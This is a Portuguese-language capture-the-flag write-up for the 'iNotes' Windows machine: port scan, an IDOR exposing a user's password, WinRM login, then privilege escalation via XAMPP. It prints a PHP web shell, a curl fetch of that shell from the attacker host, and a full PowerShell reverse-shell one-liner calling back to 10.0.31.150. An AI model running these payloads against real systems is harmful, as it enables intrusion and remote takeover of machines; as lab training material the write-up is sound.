@@ -1,0 +1,226 @@
+---
+title: 'iNotes Writeup'
+date: '2024-11-13'
+tags: ['IDOR', 'Windows']
+draft: false
+summary: 'Essa é uma maquina de campeonato da HackingClub, nela encontramos um IDOR que nos proporciona o acesso inicial e o Privillege Escalation através do XAMPP.'
+images: ['/static/images/inotes-writeup-images/default.png']
+authors: ['default']
+---
+
+![logo](/static/images/inotes-writeup-images/default.png)
+
+## **Plataforma**: Hacking Club
+
+### **Dificuldade:** Easy
+
+### **Nome**: iNotes
+
+---
+
+### **Port Scanning**
+
+`nmap -sV -sC -p- -v $IP --open`
+
+```bash
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.0.30)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-title: iNotes
+|_Requested resource was /login.php
+|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-13 13:09:38Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: inotes.hc0., Site: Default-First-Site-Name)
+443/tcp   open  ssl/http      Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
+| http-ls: Volume /
+|   maxfiles limit reached (10)
+| SIZE  TIME              FILENAME
+| 241   2024-11-06 22:10  bootstrap.php
+| -     2024-11-06 22:11  database/
+| 20K   2024-11-13 13:10  database/database.sqlite
+| -     2024-11-06 22:10  functions/
+| 129   2024-11-06 22:10  functions/auth.php
+| 319   2024-11-06 22:10  functions/db.php
+| 416   2024-11-06 22:10  functions/flash.php
+| 82    2024-11-06 22:10  functions/utils.php
+| 137   2024-11-06 04:43  mssql.xml
+| -     2024-11-06 22:10  public/
+|_
+| http-methods:
+|   Supported Methods: HEAD GET POST OPTIONS TRACE
+|_  Potentially risky methods: TRACE
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Index of /
+|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
+| tls-alpn:
+|_  http/1.1
+| ssl-cert: Subject: commonName=localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2009-11-10T23:48:47
+| Not valid after:  2019-11-08T23:48:47
+| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
+|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: inotes.hc0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=EC2AMAZ-76KN0U2.inotes.hc
+| Issuer: commonName=EC2AMAZ-76KN0U2.inotes.hc
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-11-03T21:38:30
+| Not valid after:  2025-05-05T21:38:30
+| MD5:   1381:f5d4:0072:f117:f26e:3077:5362:4890
+|_SHA-1: c4ea:7d46:283c:050f:3c94:9a76:e862:4323:4260:5a64
+| rdp-ntlm-info:
+|   Target_Name: INOTES
+|   NetBIOS_Domain_Name: INOTES
+|   NetBIOS_Computer_Name: EC2AMAZ-76KN0U2
+|   DNS_Domain_Name: inotes.hc
+|   DNS_Computer_Name: EC2AMAZ-76KN0U2.inotes.hc
+|   Product_Version: 10.0.20348
+|_  System_Time: 2024-11-13T13:10:37+00:00
+|_ssl-date: 2024-11-13T13:10:46+00:00; 0s from scanner time.
+5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49673/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49686/tcp open  msrpc         Microsoft Windows RPC
+49713/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Hosts: EC2AMAZ-76KN0U2, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2024-11-13T13:10:39
+|_  start_date: N/A
+```
+
+Por se tratar de uma maquina Windows (AD), diversos serviços em múltiplas portas estão abertos.
+
+---
+
+## Enumeration
+
+`http://172.16.4.116`
+
+![inotes](/static/images/inotes-writeup-images/image.png)
+
+Testei SQL Injection no campo de login, mas não obtive sucesso, então decidi registrar um novo usuário.
+
+![inotes 1](/static/images/inotes-writeup-images/image1.png)
+
+Após se logar.
+
+![inotes 2](/static/images/inotes-writeup-images/image2.png)
+
+Criando uma anotação de teste.
+
+![inotes 3](/static/images/inotes-writeup-images/image3.png)
+
+IDOR encontrado ao trocar o ID da nota.
+
+![inotes 4](/static/images/inotes-writeup-images/image4.png)
+
+![inotes 5](/static/images/inotes-writeup-images/image5.png)
+
+Utilizando o IDOR pra identificar e ler todas as notas presentes na aplicação.
+
+Gerei uma wordlist contendo os números de 1 a 107
+
+`seq 1 107 > wordlists.txt`
+
+Depois mandei a wordlists pro Intruder do BurpSuite para enumerar todos os IDs.
+
+![inotes 6](/static/images/inotes-writeup-images/image6.png)
+
+O ID de numero 97 revela as credenciais do usuário john.
+
+`john:Dn*Th5di7UwFJvTM`
+
+![inotes 7](/static/images/inotes-writeup-images/image7.png)
+
+---
+
+## Foot Hold
+
+O AD possui diversos serviços abertos, no entanto, o único acessivel com as credenciais achadas foi o WinRM na porta 5985.
+Com as credenciais em mãos, podemos logar na maquina via WinRM.
+
+`evil-winrm -i 172.16.4.176 -u john -p Dn*Th5di7UwFJvTM`
+
+![inotes 8](/static/images/inotes-writeup-images/image8.png)
+
+---
+
+## Privillege Escalation
+
+A maquina possui um XAMPP instalado, sabendo disso, eu criei uma web-shell em php.
+
+```python
+<?php
+if(isset($_REQUEST['cmd'])){
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+}
+?>
+```
+
+com isso, eu mandei essa web-shell para o diretório do XAMPP, que no caso fica em: `C:\xampp\htdocs`
+
+`curl http://10.0.31.150/shell.php -o shell.php`
+
+![inotes 9](/static/images/inotes-writeup-images/image9.png)
+
+![inotes 10](/static/images/inotes-writeup-images/image10.png)
+
+`https://172.16.4.176/shell.php?cmd=whoami`
+
+![inotes 11](/static/images/inotes-writeup-images/image11.png)
+
+Por fim você pode usar a web-shell pra pegar a flag final ou gerar uma reverse-shell.
+
+`https://172.16.4.176/shell.php?cmd=powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.31.150',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+
+OBS: Lembre de encodar a payload.
+
+![inotes 12](/static/images/inotes-writeup-images/image12.png)
+
+---
+
+## Proof
+
+![inotes 12](/static/images/inotes-writeup-images/image13.png)
